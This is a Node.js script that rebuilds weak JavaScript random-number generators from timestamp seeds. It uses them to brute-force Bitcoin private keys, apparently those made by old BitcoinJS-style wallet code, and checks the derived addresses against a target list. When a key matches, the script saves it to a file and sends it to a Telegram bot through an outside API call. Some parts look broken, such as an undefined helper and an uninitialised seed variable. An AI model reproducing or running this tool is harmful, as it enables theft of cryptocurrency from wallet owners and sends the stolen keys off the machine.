const crypto = require("crypto");
const secp256k1 = require("secp256k1");
const bs58check = require("bs58check");
const fs = require("fs");
const axios = require("axios");
const { performance } = require("perf_hooks");
const args = process.argv.slice(2);

console.log("Arguments passed:", args);

let adds = require("./keysToFind.json");

const startTimeStamp = args[1] - 0;
const endTimeStamp = args[2] - 0;

const randomEngine = args[0] - 0;

const telegramChatId = "",
  telegramSecret = "";

class SimplePRNG {
  constructor(seed = Date.now()) {
    this.rngstate = seed;

    this.a = 1664525;
    this.c = 1013904223;
    this.m = 0x100000000;
    this.seed = seed[0] & (this.m - 1);

    this.ringMultiplier = 0x5deece66dn;
    this.randAdded = 0xbn;
    this.rigMask = (1n << 48n) - 1n;
    this.ringDscale = 1n << 53n;

    this.setSeed(seed[0]);
  }

  randomv8() {
    var r0 =
      (Math.imul(18273, this.rngstate[0] & 0xffff) +
        (this.rngstate[0] >>> 16)) |
      0;
    this.rngstate[0] = r0;
    var r1 =
      (Math.imul(36969, this.rngstate[1] & 0xffff) +
        (this.rngstate[1] >>> 16)) |
      0;
    this.rngstate[1] = r1;
    var x = ((r0 << 16) + (r1 & 0xffff)) | 0;
    return (x < 0 ? x + 0x100000000 : x) * 2.3283064365386962890625e-10;
  }

  setSeed(seed) {
    this.rngSeed = (BigInt(seed) ^ this.ringMultiplier) & this.rigMask;
  }

  randomNext(bits) {
    let nextSeed = this.rngSeed * this.ringMultiplier;
    nextSeed += this.randAdded;
    nextSeed &= this.rigMask;
    this.rngSeed = nextSeed;
    return Number(nextSeed >> (48n - BigInt(bits)));
  }

  randomFF2() {
    const highBits = this.randomNext(26);
    const lowBits = this.randomNext(27);
    const combined = (BigInt(highBits) << 27n) + BigInt(lowBits);
    return Number(combined) / Number(this.ringDscale);
  }

  randomFF() {
    this.seed = (this.a * this.seed + this.c) % this.m;
    return this.seed / this.m;
  }
}

class SeededRandom {
  constructor(seed) {
    this.seed = seed;
  }
  
  next() {
    this.seed = (this.seed * 1664525 + 1013904223) % 4294967296;
    return this.seed;
  }
  
  range(min, max) {
    return Math.floor((this.next() / 4294967296) * (max - min) + min);
  }
}

class RNG {
  constructor() {
    this.rngPool = null;
    this.rngPptr = 0;
    this.rngPsize = 256;
    this.rngState = null;
    this.resetPool();
    this.reandomCall = false;
  }

  resetPool() {
    this.rngPool = null;
    this.rngPptr = 0;
    this.rngState = null;
  }

  seedInt(x) {
    this.rngPool[this.rngPptr++] ^= x & 255;
    this.rngPool[this.rngPptr++] ^= (x >> 8) & 255;
    this.rngPool[this.rngPptr++] ^= (x >> 16) & 255;
    this.rngPool[this.rngPptr++] ^= (x >> 24) & 255;
  }

  seedIntRandom(x) {
    this.rngPool[this.rngPptr++] = Math.floor(Math.random() * 256);
    this.rngPool[this.rngPptr++] = Math.floor(Math.random() * 256);
    this.rngPool[this.rngPptr++] = this.rngPool[2];
    this.rngPool[this.rngPptr++] = this.rngPool[3];
  }

  seedTime(isRandom, times) {
    if (isRandom) {
      this.seedIntRandom(times);
    } else {
      this.seedInt(times);
    }
  }

  initPool() {
    if (this.rngPool === null) {
      this.rngPool = new Array();

      let t;
      this.Prng = new SimplePRNG([
        global.currentSeed,
        global.currentSeed + 60000 * 10,
      ]);
      if (this.reandomCall) {
        const random1 =
          randomEngine === 0
            ? this.Prng.randomv8()
            : randomEngine === 1
            ? this.Prng.randomFF()
            : this.Prng.randomFF2();
      }
      while (this.rngPptr < this.rngPsize) {
        const random =
          randomEngine === 0
            ? this.Prng.randomv8()
            : randomEngine === 1
            ? this.Prng.randomFF()
            : this.Prng.randomFF2();
        t = Math.floor(65536 * random);
        this.rngPool[this.rngPptr++] = t >>> 8;
        this.rngPool[this.rngPptr++] = t & 255;
      }
      this.rngPptr = 0;
      this.seedTime(false, global.randomSeedTime);
    }
  }

  getByte() {
    this.initPool();
    if (this.rngState === null) {
      this.seedTime(false, global.randomSeedTime2);
      this.rngState = new ArcFour();
      this.rngState.init(this.rngPool);
      this.rngPool.fill(0);
      this.rngPptr = 0;
    }
    return this.rngState.next();
  }

  getBytes(byteArray, reandomCall) {
    this.reandomCall = reandomCall;

    if (reandomCall) {
      // if you want to randomly skip first sequence
      this.resetPool();
    }
    this.getByte(); // as 0 index shifted later
    for (let i = 0; i < byteArray.length; ++i) {
      byteArray[i] = this.getByte();
    }
  }
}

class ArcFour {
  constructor() {
    this.i = 0;
    this.j = 0;
    this.S = new Array(256).fill(0);
  }

  init(key) {
    let i,
      j = 0,
      t;
    for (i = 0; i < 256; ++i) {
      this.S[i] = i;
    }
    for (i = 0; i < 256; ++i) {
      j = (j + this.S[i] + key[i % key.length]) & 255;
      t = this.S[i];
      this.S[i] = this.S[j];
      this.S[j] = t;
    }
    this.i = 0;
    this.j = 0;
  }

  next() {
    let t;
    this.i = (this.i + 1) & 255;
    this.j = (this.j + this.S[this.i]) & 255;
    t = this.S[this.i];
    this.S[this.i] = this.S[this.j];
    this.S[this.j] = t;
    return this.S[(t + this.S[this.i]) & 255];
  }
}

function hash160(buffer) {
  const sha256 = crypto.createHash("sha256").update(buffer).digest();
  return crypto.createHash("ripemd160").update(sha256).digest();
}

function generateBitcoinAddress(publicKey, isCompressed) {
  const version = Buffer.from([0x00]);
  const publicKeyHash = hash160(publicKey);
  const address = bs58check.encode(Buffer.concat([version, publicKeyHash]));
  return address;
}

function generateBitcoinKeys(byteArray) {
  if (byteArray.length !== 32) {
    throw new Error("Private key must be 32 bytes.");
  }

  const privateKey = Buffer.from(byteArray);

  if (!secp256k1.privateKeyVerify(privateKey)) {
    throw new Error("Invalid private key.");
  }

  const uncompressedPublicKey = secp256k1.publicKeyCreate(privateKey, false);
  const compressedPublicKey = secp256k1.publicKeyCreate(privateKey, true);

  const uncompressedAddress = generateBitcoinAddress(
    uncompressedPublicKey,
    false
  );
  const compressedAddress = generateBitcoinAddress(compressedPublicKey, true);

  return {
    privateKey: privateKey.toString("hex"),
    uncompressedPublicKey: uncompressedPublicKey.toString("hex"),
    compressedPublicKey: compressedPublicKey.toString("hex"),
    uncompressedAddress,
    compressedAddress,
  };
}

const foundKeys = [];
const startTime = performance.now();
let count = 0;

for (let timestamp = startTimeStamp; timestamp < endTimeStamp; timestamp++) {
  // Seeding with an old random value, as we're unsure which seed was used by the JavaScript engine.
  // It's entirely dependent on luck, as the sequence is deterministic and regenerates the same sequence.

  global.currentSeed = getRandomNumber(startTimeStamp, endTimeStamp);
  global.randomSeedTime = timestamp;
  global.randomSeedTime2 = global.randomSeedTime2;

  for (let j = 0; j < 30 * 1000; j++) {
    // Search 30 sec from first time to check 2nd time (assuming someone used exact bitcoin js lib and no additional time seeds provided) with same random seed  global.currentSeed
    global.randomSeedTime2 = global.randomSeedTime2 + 1;

    // resets states
    let rng = new RNG();

    // calling arc Four next for 10 times
    for (let i = 0; i <= 10; i++) {
      count++;

      const byteArray = new Array(32);

      rng.getBytes(byteArray, (i + 1) % 5 === 0);

      byteArray2 = [...byteArray];
      byteArray2[31] = byteArray2[31] + 1;

      const { privateKey, compressedAddress, uncompressedAddress } =
        generateBitcoinKeys(byteArray);

      const {
        privateKey: privateKey2,
        compressedAddress: compressedAddress2,
        uncompressedAddress: uncompressedAddress2,
      } = generateBitcoinKeys(byteArray2);

      if (count % 100000 === 0) {
        console.log(
          `Searhing by worker:`,
          compressedAddress,
          Math.random(),
          new Date(global.currentSeed),
          timestamp
        );
        const endTime = performance.now();
        const timeTaken = (endTime - startTime) / 1000;

        const keysPerSecond = count / timeTaken;

        console.log(
          `Generated ${count} keys in ${timeTaken.toFixed(2)} seconds.`
        );
        console.log(`Keys per second: ${keysPerSecond.toFixed(2)}`);
      }
      // how to test its working or not put true in below if block i.e adds[compressedAddress2] || adds[uncompressedAddress2] || true or try with hardcoded address
      if (adds[compressedAddress] || adds[uncompressedAddress]) {
        console.log(
          `Match found: Address: ${compressedAddress}, Private Key (Hex): ${privateKey}`
        );
        foundKeys.push(
          `Address: ${compressedAddress}, Private Key (Hex): ${privateKey}, timestamp: ${global.currentSeed}`
        );

        fs.appendFileSync(
          "found_keys.txt",
          +"\n" + foundKeys.join("\n") + "\n" + global.currentSeed,
          new Date()
        );

        if (telegramChatId && telegramSecret) {
          axios
            .get(
              `https://api.telegram.org/bot${telegramChatId}:${telegramSecret}/sendMessage?chat_id=1468367923&text=${JSON.stringify(
                { privateKey, compressedAddress, uncompressedAddress }
              )} exact`
            )
            .then(console.log);
        }
      }

      if (adds[compressedAddress2] || adds[uncompressedAddress2]) {
        console.log(
          `Match found: Address: ${compressedAddress2}, Private Key (Hex): ${privateKey2}`
        );
        foundKeys.push(
          `Address: ${compressedAddress2}, Private Key (Hex): ${privateKey2}, timestamp: ${global.currentSeed}`
        );

        fs.appendFileSync(
          "found_keys.txt",
          +"\n" + foundKeys.join("\n") + "\n" + global.currentSeed,
          new Date()
        );

        if (telegramChatId && telegramSecret) {
          axios
            .get(
              `https://api.telegram.org/bot${telegramChatId}:${telegramSecret}/sendMessage?chat_id=1468367923&text=${JSON.stringify(
                { privateKey2, compressedAddress2, uncompressedAddress2 }
              )} exact`
            )
            .then(console.log);
        }
      }
    }
  }
}
